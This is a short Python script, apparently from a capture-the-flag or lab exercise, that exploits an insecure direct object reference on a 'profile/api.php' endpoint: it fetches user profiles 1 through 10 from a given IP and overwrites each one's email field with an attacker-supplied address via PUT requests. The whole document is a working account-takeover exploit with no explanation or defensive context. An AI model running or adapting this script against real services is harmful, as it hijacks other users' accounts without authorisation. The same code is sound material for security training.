import requests
import json

print("Enter the IP Adress:")
ip = input()

print("Enter the Mail:")
mail = input()

mail_key = 'email'

for i in range(1, 11):
    x = requests.get(f"http://{ip}/profile/api.php/profile/{i}")

    data = json.loads(x.text)

    if mail_key in data:
        data[mail_key] = mail

    new_data = json.dumps(data)

    res = requests.put(f"http://{ip}/profile/api.php/profile/{i}", data=new_data)
    print("Status Code: ", res.status_code)
    print("Response Code: ", res.content.decode())
